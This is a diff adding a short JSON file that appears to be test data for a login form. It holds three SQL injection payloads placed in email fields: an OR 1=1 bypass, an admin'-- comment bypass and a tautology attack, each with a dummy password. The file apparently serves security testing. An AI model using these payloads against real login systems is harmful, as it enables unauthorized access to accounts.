@@ -1,0 +1,16 @@
+[
+    {
+        "desc":"Bypass Authentication (OR 1=1)",
+        "email":"'OR.1=1.--@gmail.com",
+        "pwd":"test123456"
+    },{
+        "desc":"Bypass with Comment (Single Quote)",
+        "email":"admin'--@gmail.com",
+        "pwd":"test123456"
+    },
+    {
+        "desc":"Tautology Attack",
+        "email":"1'OR'1'='1'--@gmail.com",
+        "pwd":"test123456"
+    }
+]
